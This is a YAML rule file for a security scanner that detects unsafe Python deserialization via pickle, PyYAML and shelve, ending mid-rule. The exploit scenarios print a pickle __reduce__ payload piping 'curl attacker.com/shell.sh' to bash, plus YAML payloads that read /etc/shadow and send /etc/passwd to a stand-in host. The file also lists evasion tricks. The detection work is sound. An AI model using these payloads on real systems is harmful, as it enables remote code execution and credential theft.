rules:
  # ============================================================================
  # DESER-PY-001: pickle.loads / pickle.load with Untrusted Data
  # ============================================================================
  - rule_id: "DESER-PY-001"
    title: "Pickle Deserialization of Untrusted Data Leading to Remote Code Execution"
    description: >
      Detects usage of pickle.loads(), pickle.load(), cPickle.loads(),
      cPickle.load(), or _pickle.loads() on data originating from untrusted
      sources. Python's pickle module can serialize and deserialize arbitrary
      Python objects including code objects. The __reduce__ method allows any
      class to define custom reconstruction logic that executes during
      unpickling. An attacker who can control pickled data can achieve
      arbitrary code execution by crafting a payload that invokes os.system,
      subprocess.Popen, or any other callable during deserialization.
    language: python
    category: deserialization
    severity: Critical
    confidence: 0.95
    cwe: CWE-502
    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
    tags:
      - deserialization
      - pickle
      - rce
      - python
      - critical
      - untrusted-data
      - code-execution
    detection_layer: 1
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: 'pickle\.(loads?|Unpickler)\s*\(\s*(request\.|data|payload|body|content|message|received|raw|user_input)'
        description: "pickle.load/loads called on user-controlled variable"
      - type: regex
        pattern: 'cPickle\.(loads?|Unpickler)\s*\(\s*(request\.|data|payload|body|content|message)'
        description: "cPickle.load/loads on user-controlled input"
      - type: regex
        pattern: '_pickle\.(loads?|Unpickler)\s*\('
        description: "Internal _pickle module usage for deserialization"
      - type: regex
        pattern: 'pickle\.loads?\s*\(\s*(base64\.b64decode|binascii\.unhexlify|codecs\.decode)\s*\('
        description: "pickle.load on decoded data from encoded source"
      - type: regex
        pattern: 'pickle\.loads?\s*\(\s*request\.(get_data|get_json|form|args|files)'
        description: "pickle.loads on Flask request data"
      - type: regex
        pattern: 'pickle\.loads?\s*\(\s*(redis_client|r|cache|memcache|mc)\.(get|hget|lpop|rpop|brpop)\s*\('
        description: "pickle.loads on data retrieved from cache/message queue"
      - type: regex
        pattern: 'pickle\.loads?\s*\(\s*socket\.\w*recv'
        description: "pickle.loads on data received from network socket"
      - type: regex
        pattern: 'Unpickler\s*\(\s*(io\.BytesIO|BytesIO)\s*\(\s*(data|payload|body|content|request)'
        description: "Unpickler initialized with BytesIO wrapping untrusted data"
    anti_patterns:
      - 'pickle\.loads?\s*\(\s*pickle\.dumps?\s*\('
      - 'pickle\.loads?\s*\(\s*open\s*\(\s*["\x27](/etc/|config|settings)'
      - 'pickle\.loads?\s*\(\s*["\x27]'
      - '#\s*nosec'
      - '#\s*noqa'
      - 'hmac\.compare_digest.*pickle'
      - 'signed_cookie.*pickle'
      - 'pickle\.loads?\s*\(\s*self\._cache'
      - 'pickle\.loads?\s*\(\s*internal'
      - 'pickle\.loads?\s*\(\s*trusted'
      - 'RestrictedUnpickler.*pickle'
      - 'find_class.*restrict'
      - 'pickle\.loads?\s*\(\s*(fixture|mock|test_data|sample)'
      - 'pickle\.loads?\s*\(\s*self\.\w+_data\s*\)'
      - 'pickle\.loads?\s*\(\s*Path\s*\('
    bypass_variants:
      - description: "Using __reduce__ method to execute os.system during unpickling"
        pattern: '__reduce__\s*\(.*\)\s*:\s*return\s*\(\s*os\.system'
      - description: "Aliasing pickle module to evade static analysis"
        pattern: '(import\s+pickle\s+as\s+\w+|\w+\s*=\s*__import__\s*\(\s*["\x27]pickle["\x27]\s*\))'
      - description: "Using pickletools or copyreg to construct malicious payload"
        pattern: '(pickletools|copyreg)\.\w+.*pickle\.(loads|Unpickler)'
    evasion_indicators:
      - "Module aliasing of pickle to bypass static analysis"
      - "__import__('pickle') dynamic import"
      - "Base64 or hex-encoded pickle payload"
      - "Pickle protocol version manipulation"
      - "Use of pickletools to obfuscate payload opcodes"
    encoding_variants:
      - type: "base64"
        pattern: 'pickle\.loads?\s*\(\s*base64\.(b64decode|decodebytes)\s*\('
      - type: "hex"
        pattern: 'pickle\.loads?\s*\(\s*(bytes\.fromhex|binascii\.unhexlify)\s*\('
      - type: "zlib_compressed"
        pattern: 'pickle\.loads?\s*\(\s*zlib\.decompress\s*\('
    multi_function_chain_patterns:
      - "HTTP request -> base64 decode -> pickle.loads -> code execution"
      - "Redis get -> pickle.loads -> object instantiation -> method call"
      - "File upload -> read content -> pickle.loads -> RCE"
      - "Message queue consume -> pickle.loads -> task execution"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Pickle deserialization executes arbitrary Python code with the permissions of the running process, typically the web server user"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "HTTP request body / form data / file upload"
        sink: "pickle.loads / pickle.load"
        through: "Direct parameter passing or base64 decoding"
      - source: "Redis / Memcached cached value"
        sink: "pickle.loads"
        through: "Cache get operation (cache poisoning scenario)"
      - source: "Message queue (Celery/RabbitMQ/SQS)"
        sink: "pickle.loads"
        through: "Task serializer deserialization"
    impact: |
      Pickle deserialization of untrusted data leads to:
      - Arbitrary Remote Code Execution with server process privileges
      - Full server compromise including file system access
      - Data exfiltration from databases and internal services
      - Lateral movement within the network
      - Persistent backdoor installation
      - Complete confidentiality, integrity, and availability compromise
    remediation: |
      1. Never use pickle with untrusted data. Use JSON or other safe formats:
         ```python
         import json
         data = json.loads(user_input)
         ```
      2. If pickle is absolutely required, implement a restricted unpickler:
         ```python
         import pickle
         import io

         ALLOWED_CLASSES = {
             ('myapp.models', 'SafeModel'),
             ('builtins', 'dict'),
             ('builtins', 'list'),
         }

         class RestrictedUnpickler(pickle.Unpickler):
             def find_class(self, module, name):
                 if (module, name) not in ALLOWED_CLASSES:
                     raise pickle.UnpicklingError(
                         f"Forbidden class: {module}.{name}"
                     )
                 return super().find_class(module, name)

         def safe_loads(data):
             return RestrictedUnpickler(io.BytesIO(data)).load()
         ```
      3. Sign pickled data with HMAC before storing and verify before loading.
      4. Use Celery with JSON serializer instead of pickle.
      5. Implement Content Security Policy for stored objects.
    references:
      - "https://cwe.mitre.org/data/definitions/502.html"
      - "https://docs.python.org/3/library/pickle.html#restricting-globals"
      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
      - "https://blog.nelhage.com/2011/03/exploiting-pickle/"
    context_awareness:
      surrounding_context_patterns:
        - "pickle import in same file"
        - "No RestrictedUnpickler implementation"
        - "User-controlled data flows into pickle.loads"
        - "No HMAC verification before unpickling"
      taint_source_indicators:
        - "request.data"
        - "request.body"
        - "request.files"
        - "socket.recv"
        - "redis.get"
        - "queue.get"
      taint_sink_indicators:
        - "pickle.loads"
        - "pickle.load"
        - "cPickle.loads"
        - "Unpickler.load"
        - "_pickle.loads"
      sanitization_patterns:
        - "RestrictedUnpickler with find_class override"
        - "HMAC signature verification"
        - "Allowlist-based class restriction"
        - "Pickle data source authentication"
    severity_scoring:
      severity_weight: 10
      risk_score_formula_hint: "severity_weight * confidence * (1 - restricted_unpickler_present)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A Flask web application accepts serialized Python objects via an API
        endpoint for batch data import. The endpoint reads the request body
        and passes it to pickle.loads(). An attacker crafts a pickle payload:
        import pickle, os
        class Exploit:
            def __reduce__(self):
                return (os.system, ('curl attacker.com/shell.sh | bash',))
        payload = pickle.dumps(Exploit())
        The attacker sends this payload as the request body. When the server
        calls pickle.loads(request.data), the __reduce__ method is invoked,
        executing os.system with the attacker's command, establishing a
        reverse shell.
      example_payload: "b\"\\x80\\x04\\x95...cos\\nsystem\\n...curl attacker.com/shell.sh|bash...\""
      attacker_objective: "Execute arbitrary system commands on the server through pickle deserialization to establish persistent access"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: false
      high_impact_flag: true
      related_rules:
        - "DESER-PY-002"
        - "DESER-PY-003"
        - "DESER-PY-006"
        - "DESER-PY-007"

  # ============================================================================
  # DESER-PY-002: yaml.load without SafeLoader
  # ============================================================================
  - rule_id: "DESER-PY-002"
    title: "PyYAML yaml.load Without SafeLoader Enabling Code Execution"
    description: >
      Detects usage of yaml.load() without specifying Loader=yaml.SafeLoader
      or Loader=yaml.BaseLoader. In PyYAML versions prior to 6.0, yaml.load()
      defaults to yaml.FullLoader (or yaml.Loader in older versions) which
      supports Python-specific YAML tags such as !!python/object,
      !!python/object/apply, and !!python/module. These tags allow
      instantiation of arbitrary Python objects during YAML parsing,
      leading to remote code execution when processing untrusted YAML input.
    language: python
    category: deserialization
    severity: Critical
    confidence: 0.93
    cwe: CWE-502
    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
    tags:
      - deserialization
      - yaml
      - pyyaml
      - rce
      - unsafe-loader
      - python
      - critical
    detection_layer: 1
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: 'yaml\.load\s*\(\s*[^)]*\)\s*(?!.*Loader\s*=\s*(SafeLoader|BaseLoader|yaml\.SafeLoader|yaml\.BaseLoader))'
        description: "yaml.load called without SafeLoader or BaseLoader"
      - type: regex
        pattern: 'yaml\.load\s*\(\s*(request\.|data|payload|body|content|input|raw|text|stream)'
        description: "yaml.load on user-controlled input without safe loader"
      - type: regex
        pattern: 'yaml\.load\s*\([^)]*Loader\s*=\s*(yaml\.)?(Loader|FullLoader|UnsafeLoader)'
        description: "yaml.load with explicitly unsafe Loader parameter"
      - type: regex
        pattern: 'yaml\.load_all\s*\(\s*(request\.|data|payload|body|content|input)'
        description: "yaml.load_all processing multiple documents from untrusted source"
      - type: regex
        pattern: 'yaml\.unsafe_load\s*\('
        description: "Explicit yaml.unsafe_load function call"
      - type: regex
        pattern: 'yaml\.full_load\s*\(\s*(request\.|data|payload|body|content|input)'
        description: "yaml.full_load on untrusted data"
      - type: regex
        pattern: 'yaml\.load\s*\(\s*(open|f\.read|file\.read|stream\.read)'
        description: "yaml.load on file content that may be user-controlled"
      - type: regex
        pattern: 'yaml\.load\s*\(\s*(response\.(text|content|json)|urllib|requests\.\w+)'
        description: "yaml.load on data fetched from external sources"
    anti_patterns:
      - 'yaml\.safe_load\s*\('
      - 'yaml\.load\s*\([^)]*Loader\s*=\s*(yaml\.)?SafeLoader'
      - 'yaml\.load\s*\([^)]*Loader\s*=\s*(yaml\.)?BaseLoader'
      - 'yaml\.load\s*\(\s*["\x27]'
      - 'yaml\.safe_load_all\s*\('
      - 'yaml\.load\s*\(\s*open\s*\(\s*["\x27](/etc/|config\.y|settings\.y)'
      - '#\s*nosec'
      - '#\s*noqa'
      - 'yaml\.load\s*\(\s*fixture'
      - 'yaml\.load\s*\(\s*mock'
      - 'yaml\.load\s*\(\s*test'
      - 'yaml\.load\s*\(\s*sample'
      - 'yaml\.load\s*\(\s*Path\s*\(\s*__file__'
      - 'yaml\.load\s*\(\s*pkg_resources'
      - 'yaml\.load\s*\(\s*importlib'
    bypass_variants:
      - description: "Using !!python/object/apply tag to invoke arbitrary callables"
        pattern: '!!python/object/apply\s*:\s*\w+'
      - description: "Dynamic Loader class construction to bypass safe loader checks"
        pattern: 'type\s*\(\s*["\x27]\w+Loader["\x27].*yaml\.(Loader|FullLoader)'
      - description: "Monkey-patching yaml.SafeLoader to add unsafe constructors"
        pattern: 'yaml\.SafeLoader\.add_constructor\s*\(\s*["\x27]!!python'
    evasion_indicators:
      - "Aliasing yaml module to bypass static detection"
      - "Dynamic Loader class selection based on configuration"
      - "Custom constructor registration on SafeLoader (weakening it)"
      - "Base64 or hex-encoded YAML content"
      - "YAML tag obfuscation via anchors and aliases"
    encoding_variants:
      - type: "base64"
        pattern: 'yaml\.load\s*\(\s*base64\.(b64decode|decodebytes)\s*\('
      - type: "url_encoded"
        pattern: 'yaml\.load\s*\(\s*urllib\.parse\.unquote\s*\('
      - type: "compressed"
        pattern: 'yaml\.load\s*\(\s*(zlib\.decompress|gzip\.decompress)\s*\('
    multi_function_chain_patterns:
      - "HTTP request -> yaml.load -> config mutation -> privilege escalation"
      - "File upload -> read content -> yaml.load -> RCE"
      - "API response -> yaml.load -> data processing -> injection"
      - "Git webhook -> yaml.load CI config -> build command execution"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "YAML deserialization with FullLoader/Loader allows construction of arbitrary Python objects, executing code during parsing"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "HTTP request body / file upload"
        sink: "yaml.load"
        through: "Direct parameter passing"
      - source: "Configuration file from untrusted source"
        sink: "yaml.load"
        through: "File read operation"
      - source: "External API response"
        sink: "yaml.load"
        through: "HTTP client response parsing"
    impact: |
      Unsafe YAML deserialization in Python can result in:
      - Remote Code Execution via !!python/object/apply tags
      - Arbitrary object instantiation leading to server compromise
      - File system access through crafted YAML constructors
      - Denial of Service via billion-laughs YAML bomb
      - Information disclosure through object attribute access
    remediation: |
      1. Always use yaml.safe_load instead of yaml.load:
         ```python
         import yaml
         data = yaml.safe_load(user_input)
         ```
      2. If yaml.load is required, always specify SafeLoader:
         ```python
         data = yaml.load(user_input, Loader=yaml.SafeLoader)
         ```
      3. For multiple documents, use yaml.safe_load_all:
         ```python
         for doc in yaml.safe_load_all(user_input):
             process(doc)
         ```
      4. Set YAML input size limits to prevent DoS attacks.
      5. Upgrade PyYAML to version 6.0+ which warns on unsafe usage.
    references:
      - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1747"
      - "https://pyyaml.org/wiki/PyYAMLDocumentation"
      - "https://cwe.mitre.org/data/definitions/502.html"
      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
    context_awareness:
      surrounding_context_patterns:
        - "yaml/pyyaml import in same file"
        - "No Loader parameter in yaml.load call"
        - "User-controlled data flows into yaml.load"
        - "No input size validation before YAML parsing"
      taint_source_indicators:
        - "request.data"
        - "request.body"
        - "file.read()"
        - "response.text"
        - "open().read()"
        - "stdin.read()"
      taint_sink_indicators:
        - "yaml.load"
        - "yaml.load_all"
        - "yaml.unsafe_load"
        - "yaml.full_load"
        - "YAML().load"
      sanitization_patterns:
        - "Loader=yaml.SafeLoader"
        - "Loader=yaml.BaseLoader"
        - "yaml.safe_load"
        - "Input size limit check"
    severity_scoring:
      severity_weight: 10
      risk_score_formula_hint: "severity_weight * confidence * (1 - safe_loader_present)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A Django REST API accepts YAML-formatted configuration uploads. The
        view processes uploaded files using yaml.load(file_content). An
        attacker uploads a YAML file containing:
        !!python/object/apply:subprocess.check_output
        args: [['cat', '/etc/shadow']]
        When yaml.load processes this, it invokes subprocess.check_output
        with the attacker's command, reading the shadow password file. The
        result is returned as part of the deserialized object, leaking
        sensitive system information.
      example_payload: "!!python/object/apply:os.system ['curl attacker.com/$(cat /etc/passwd | base64)']"
      attacker_objective: "Execute arbitrary system commands through YAML deserialization to exfiltrate sensitive data"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: false
      high_impact_flag: true
      related_rules:
        - "DESER-PY-001"
        - "DESER-JS-003"

  # ============================================================================
  # DESER-PY-003: shelve / dbm Deserialization
  # ============================================================================
  - rule_id: "DESER-PY-003"
    title: "shelve or dbm Module Deserialization of Untrusted Database Files"
    description: >
      Detects usage of Python's shelve module or direct dbm usage on database
      files from untrusted sources. The shelve module uses pickle internally
      to serialize and deserialize values stored in dbm-style databases.
      Opening a shelve database file from an untrusted source and accessing
      any value triggers pickle deserialization, which can lead to arbitrary
      code execution. Similarly, crafted dbm files can exploit parser bugs
      in the underlying database library.
    language: python
    category: deserialization
    severity: High
    confidence: 0.90
    cwe: CWE-502
    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
    tags:
      - deserialization
      - shelve
      - dbm
      - pickle
      - python
      - file-based
      - rce
    detection_layer: 2
    attack_surface_type: "web"
    patterns:
      - type: regex
        pattern: 'shelve\.open\s*\(\s*(request\.|data|payload|path|filename|user_input|upload|file_path)'
        description: "shelve.open on user-controlled file path"
      - type: regex
        pattern: 'shelve\.open\s*\(\s*os\.path\.join\s*\([^)]*request\.'
        description: "shelve.open with path constructed from request data"
      - type: regex
        pattern: 'dbm\.(open|gnu\.open|ndbm\.open)\s*\(\s*(request\.|data|payload|path|filename|user_input)'
        description: "dbm.open on user-controlled file path"
      - type: regex
        pattern: 'shelve\.open\s*\(\s*(temp|tmp|upload|download)'
        description: "shelve.open on temporary or uploaded file"
      - type: regex
        pattern: 'shelve\.DbfilenameShelf\s*\(\s*(request\.|data|path|filename)'
        description: "Direct DbfilenameShelf instantiation with untrusted path"
      - type: regex
        pattern: 'shelve\.open\s*\(\s*f["\x27]'
        description: "shelve.open with f-string path potentially including user input"
    anti_patterns:
      - 'shelve\.open\s*\(\s*["\x27](/var/lib/|/opt/|/etc/|config|internal|settings)'
      - 'shelve\.open\s*\(\s*os\.path\.join\s*\(\s*BASE_DIR'
      - 'shelve\.open\s*\(\s*["\x27][a-zA-Z_]+["\x27]\s*\)'
      - '#\s*nosec'
      - '#\s*noqa'
      - 'shelve\.open\s*\(\s*self\._db_path'
      - 'mock.*shelve'
      - 'shelve\.open\s*\(\s*fixture'
      - 'shelve\.open\s*\(\s*test_'
      - '\/\/\s*test'
      - 'shelve\.open\s*\(\s*os\.path\.join\s*\(\s*["\x27]'
      - 'shelve\.open\s*\(\s*CACHE_DIR'
      - 'shelve\.open\s*\(\s*DATA_DIR'
    bypass_variants:
      - description: "Path traversal to access attacker-controlled shelve file"
        pattern: 'shelve\.open\s*\([^)]*\.\.\/'
      - description: "Symlink-based attack on shelve database path"
        pattern: 'os\.path\.realpath\s*\([^)]*\).*shelve\.open'
      - description: "Uploading a shelve database file then opening it"
        pattern: '(save|write|upload).*\.(db|dir|bak|dat).*shelve\.open'
    evasion_indicators:
      - "Uploaded file stored then opened with shelve.open"
      - "Path traversal in shelve.open argument"
      - "Symlink following to attacker-controlled database"
      - "Temporary file used as shelve database from upload"
    encoding_variants:
      - type: "path_traversal"
        pattern: 'shelve\.open\s*\(\s*["\x27].*\.\.\/'
      - type: "url_decoded_path"
        pattern: 'shelve\.open\s*\(\s*urllib\.parse\.unquote\s*\('
      - type: "base64_path"
        pattern: 'shelve\.open\s*\(\s*base64\.b64decode\s*\('
    multi_function_chain_patterns:
      - "File upload -> save to disk -> shelve.open -> pickle deserialization -> RCE"
      - "File path from request -> shelve.open -> key access -> code execution"
      - "Download remote file -> shelve.open -> data extraction -> compromise"
      - "User-controlled path -> os.path.join -> shelve.open -> value read"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Shelve internally uses pickle, so opening an attacker-controlled shelve database file and reading any key triggers arbitrary code execution"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "File upload / user-controlled file path"
        sink: "shelve.open"
        through: "File system save then open"
      - source: "Request parameter (file path)"
        sink: "shelve.open"
        through: "Path construction from user input"
      - source: "Downloaded file from external URL"
        sink: "shelve.open"
        through: "HTTP download then file open"
    impact: |
      Shelve/dbm deserialization of untrusted files can lead to:
      - Remote Code Execution via pickle payloads in shelve values
      - Arbitrary file system access through path traversal
      - Data corruption of legitimate shelve databases
      - Denial of Service through malformed database files
      - Privilege escalation if shelve is accessed by privileged processes
    remediation: |
      1. Never open shelve databases from untrusted sources:
         ```python
         # Bad: user-controlled path
         db = shelve.open(user_provided_path)

         # Good: use fixed, application-controlled paths
         db = shelve.open(os.path.join(APP_DATA_DIR, 'internal_cache'))
         ```
      2. Replace shelve with a safe database solution:
         ```python
         import sqlite3
         conn = sqlite3.connect(os.path.join(APP_DATA_DIR, 'data.db'))
         ```
      3. If shelve must be used, validate and sanitize file paths.
      4. Use JSON-based storage for user-submitted data.
      5. Implement file upload validation to reject shelve database file types.
    references:
      - "https://docs.python.org/3/library/shelve.html#restrictions"
      - "https://cwe.mitre.org/data/definitions/502.html"
      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
    context_awareness:
      surrounding_context_patterns:
        - "shelve import in same file"
        - "File upload handling before shelve.open"
        - "User-controlled variable in shelve.open argument"
        - "No path validation before shelve.open"
